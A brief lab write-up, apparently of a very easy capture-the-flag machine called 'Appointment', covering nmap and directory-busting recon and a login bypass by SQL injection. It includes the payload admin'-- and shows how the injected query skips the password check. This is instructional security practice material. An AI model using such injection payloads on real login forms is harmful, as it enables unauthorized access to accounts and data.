**Title:** 00 - Appointment
**Tags:** [[Very Easy]]
**Topics:** #SQLi #SQL 

---

# Intro
| Dificulty | OS | Start Date | End Date |
|---|---|---|---|
| Very Easy | Linux | 10/05/2022 | 10/05/2022 |


# Thought process
1. View running services with `nmap`.
2. Check if there were subdirectories with the `dirbust`.
3. Since it was a LogIn, see if SQL Injection can be done.


# Resolution
To Login a Web is just a SELECT to the database, but if in the username you write **admin'--** the rest of the query is commented out and does not look for a password. SQL Injection. 

> Normal Login Query
```sql
SELECT * FROM users WHERE name='admin' and password='123456aA'
```

> Query with SQL Injection
```sql
SELECT * FROM members WHERE username = 'admin'--' AND password = '123456aA'
```


# Links
[SQL Injection Cheat Sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
